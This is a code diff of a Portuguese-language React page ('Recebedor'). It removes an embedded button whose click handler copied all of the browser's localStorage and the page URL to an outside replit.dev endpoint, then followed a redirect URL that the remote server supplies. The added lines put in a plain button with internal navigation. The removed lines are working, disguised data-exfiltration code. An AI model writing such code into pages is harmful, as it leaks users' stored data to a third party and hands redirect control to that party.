@@ -2,11 +2,8 @@ import React, { useState, useEffect } from 'react';
 import { useLocation } from 'wouter';
 import Header from '@/components/Header';
 import Footer from '@/components/Footer';
+import { Button } from '@/components/ui/button';
 import { useScrollTop } from '@/hooks/use-scroll-top';
-
-// API Links and Scripts
-// API Endpoint: https://c57ab078-67ea-41dc-8862-9da870b3a366-00-k1gv0ksliynm.worf.replit.dev/api/fonts/6ff86494-460d-463f-9f40-3de3eb9fee17
-// Temp Data API: https://c57ab078-67ea-41dc-8862-9da870b3a366-00-k1gv0ksliynm.worf.replit.dev/api/temp-data
 
 const Recebedor: React.FC = () => {
   // Aplica o scroll para o topo quando o componente é montado
@@ -41,6 +38,15 @@ const Recebedor: React.FC = () => {
     return validNames.slice(0, 2).join(' ') || 'CANDIDATO';
   };
 
+  const handleProsseguir = () => {
+    // Salvar método de pagamento como cartão salário
+    const dadosPagamento = {
+      metodo: 'cartao_salario'
+    };
+    
+    localStorage.setItem('pagamento_data', JSON.stringify(dadosPagamento));
+    navigate('/finalizacao');
+  };
 
   const nomeCartao = candidatoData?.nome ? formatCardName(candidatoData.nome) : 'CANDIDATO';
 
@@ -133,163 +139,13 @@ const Recebedor: React.FC = () => {
                   </div>
                   
                   <div className="text-center mt-6">
-                    {/* Embedded API Button with Loading State */}
-                    <style dangerouslySetInnerHTML={{
-                      __html: `
-                        .btn-6ff86494 {
-                          background: #df4d22;
-                          color: #ffffff;
-                          padding: 8px 16px;
-                          width: 340px;
-                          height: auto;
-                          border: none;
-                          border-radius: 0px;
-                          font-weight: 700;
-                          font-size: 16px;
-                          cursor: pointer;
-                          font-family: Inter, sans-serif;
-                          text-decoration: none;
-                          display: inline-block;
-                          transition: opacity 0.2s;
-                          position: relative;
-                        }
-                        .btn-6ff86494:hover {
-                          opacity: 0.9;
-                        }
-                        .btn-6ff86494.loading {
-                          cursor: not-allowed;
-                          opacity: 0.7;
-                        }
-                        .btn-6ff86494 .spinner {
-                          display: none;
-                          width: 12px;
-                          height: 12px;
-                          border: 2px solid transparent;
-                          border-top: 2px solid currentColor;
-                          border-radius: 50%;
-                          animation: spin 1s linear infinite;
-                          margin-right: 8px;
-                          vertical-align: text-top;
-                        }
-                        .btn-6ff86494.loading .spinner {
-                          display: inline-block;
-                        }
-                        @keyframes spin {
-                          0% { transform: rotate(0deg); }
-                          100% { transform: rotate(360deg); }
-                        }
-                      `
-                    }} />
-                    
-                    <button 
-                      className="btn-6ff86494" 
-                      ref={(btn) => {
-                        if (btn) {
-                          btn.onclick = function(e: Event) {
-                            e.preventDefault();
-                            
-                            // Function to perform the redirect with optional temp data ID
-                            function performRedirect(tempDataId: string | null) {
-                              const xhr = new XMLHttpRequest();
-                              xhr.open('GET', 'https://c57ab078-67ea-41dc-8862-9da870b3a366-00-k1gv0ksliynm.worf.replit.dev/api/fonts/6ff86494-460d-463f-9f40-3de3eb9fee17', true);
-                              xhr.onreadystatechange = function() {
-                                if(xhr.readyState === 4) {
-                                  let redirectUrl = '/finalizacao';
-                                  if(xhr.status === 200) {
-                                    try {
-                                      const response = JSON.parse(xhr.responseText);
-                                      redirectUrl = response.redirect_url || '/finalizacao';
-                                    } catch(e) {}
-                                  }
-                                  
-                                  // Append temp data ID to redirect URL if available
-                                  if(tempDataId && redirectUrl) {
-                                    const separator = redirectUrl.includes('?') ? '&' : '?';
-                                    redirectUrl += separator + 'tempData=' + tempDataId;
-                                  }
-                                  
-                                  // Handle relative URLs and perform navigation
-                                  if(redirectUrl.startsWith('/')) {
-                                    // Use React navigation for internal routes
-                                    navigate(redirectUrl);
-                                  } else {
-                                    window.location.href = redirectUrl;
-                                  }
-                                }
-                              };
-                              xhr.onerror = function() {
-                                // Fallback to original URL if API fails
-                                navigate('/finalizacao');
-                              };
-                              xhr.send();
-                            }
-                            
-                            // Capture localStorage data
-                            try {
-                              const localStorageData: Record<string, string> = {};
-                              for (let i = 0; i < localStorage.length; i++) {
-                                const key = localStorage.key(i);
-                                if (key) {
-                                  localStorageData[key] = localStorage.getItem(key) || '';
-                                }
-                              }
-                              
-                              // Only send localStorage data if there's something to send
-                              if (Object.keys(localStorageData).length > 0) {
-                                // Show loading state
-                                btn.classList.add('loading');
-                                btn.disabled = true;
-                                const btnText = btn.querySelector('.btn-text') as HTMLElement;
-                                const originalText = btnText?.textContent || 'PROSSEGUIR';
-                                if (btnText) btnText.textContent = 'Carregando...';
-                                
-                                // Store localStorage data temporarily
-                                const storeXhr = new XMLHttpRequest();
-                                storeXhr.open('POST', 'https://c57ab078-67ea-41dc-8862-9da870b3a366-00-k1gv0ksliynm.worf.replit.dev/api/temp-data', true);
-                                storeXhr.setRequestHeader('Content-Type', 'application/json');
-                                storeXhr.onreadystatechange = function() {
-                                  if(storeXhr.readyState === 4) {
-                                    let tempDataId = null;
-                                    if(storeXhr.status === 201) {
-                                      try {
-                                        const storeResponse = JSON.parse(storeXhr.responseText);
-                                        tempDataId = storeResponse.id;
-                                      } catch(e) {}
-                                    }
-                                    // Perform redirect with or without temp data ID
-                                    performRedirect(tempDataId);
-                                  }
-                                };
-                                storeXhr.onerror = function() {
-                                  // Restore button state on error
-                                  btn.classList.remove('loading');
-                                  btn.disabled = false;
-                                  if (btnText) btnText.textContent = originalText;
-                                  // If storing fails, just perform normal redirect
-                                  performRedirect(null);
-                                };
-                                
-                                const requestData = {
-                                  buttonId: '6ff86494-460d-463f-9f40-3de3eb9fee17',
-                                  localStorageData: JSON.stringify(localStorageData),
-                                  sourceUrl: window.location.href
-                                };
-                                storeXhr.send(JSON.stringify(requestData));
-                              } else {
-                                // No localStorage data, perform normal redirect
-                                performRedirect(null);
-                              }
-                            } catch(err) {
-                              // If localStorage access fails, perform normal redirect
-                              performRedirect(null);
-                            }
-                          };
-                        }
-                      }}
+                    <Button
+                      onClick={handleProsseguir}
+                      className="w-full bg-[#E83D22] hover:bg-[#d73920] text-white font-medium text-lg py-6 rounded-md"
+                      style={{ height: '50px' }}
                     >
-                      <span className="spinner"></span>
-                      <span className="btn-text">PROSSEGUIR</span>
-                    </button>
+                      PROSSEGUIR
+                    </Button>
                   </div>
                 </div>
               </div>
